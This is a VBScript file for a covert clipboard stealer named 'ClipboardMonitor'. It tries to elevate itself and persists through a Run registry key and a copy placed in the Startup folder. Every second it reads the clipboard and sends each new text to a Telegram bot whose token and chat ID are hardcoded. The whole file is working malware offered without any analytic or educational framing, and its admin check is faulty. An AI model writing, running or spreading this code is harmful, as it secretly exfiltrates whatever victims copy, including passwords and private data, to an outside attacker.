' Check if the script is running with administrator privileges
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' If not running as admin, re-run with elevated privileges
If Not IsAdmin() Then
    ' Use the ShellExecute method to run the script as administrator
    objShell.Run "wscript.exe """ & WScript.ScriptFullName & """", 0, True
    WScript.Quit
End If

' Function to check if the script is running as administrator
Function IsAdmin()
    On Error Resume Next
    Dim objShell, objEnv
    Set objShell = CreateObject("WScript.Shell")
    Set objEnv = objShell.Environment("Process")
    
    ' Admin privileges are determined by the ability to access system folders like Program Files
    IsAdmin = (objEnv("ProgramFiles(x86)") <> "")
    On Error GoTo 0
End Function

' Add to startup registry for automatic execution on login
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClipboardMonitor"
strScriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)

On Error Resume Next
If objShell.RegRead(strRegPath) = "" Then
    objShell.RegWrite strRegPath, "wscript.exe //B " & strScriptPath, "REG_SZ"
End If
On Error GoTo 0

' Save a copy of the script in the Startup folder to ensure it starts automatically
strStartupFolder = objShell.SpecialFolders("Startup")
strDestPath = strStartupFolder & "\" & objFSO.GetFileName(WScript.ScriptFullName)
If Not objFSO.FileExists(strDestPath) Then
    objFSO.CopyFile WScript.ScriptFullName, strDestPath
End If

' Telegram Bot details
botToken = "8193387679:AAGG3-UoQqRlTnrcBt7OxUJsB-cPUu8woPc"
chatID = "7055058745"

' Function to send message to Telegram
Function SendTelegramMessage(message)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
    xmlhttp.Send
    If Err.Number <> 0 Then Err.Clear
End Function

' Function to get text from clipboard
Function GetClipboardText()
    On Error Resume Next
    Dim clipboardText
    clipboardText = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
    If clipboardText = "" Then GetClipboardText = "No text found" Else GetClipboardText = clipboardText
    If Err.Number <> 0 Then Err.Clear
End Function

' Main loop to keep script running and monitor clipboard
On Error Resume Next
Do While True
    Dim currentClipboardText, lastClipboardText
    currentClipboardText = GetClipboardText()
    
    If currentClipboardText <> "" And currentClipboardText <> lastClipboardText Then
        lastClipboardText = currentClipboardText
        SendTelegramMessage "New clipboard text: " & currentClipboardText
    End If
    
    WScript.Sleep 1000 ' Check every second
    If Err.Number <> 0 Then Err.Clear
Loop
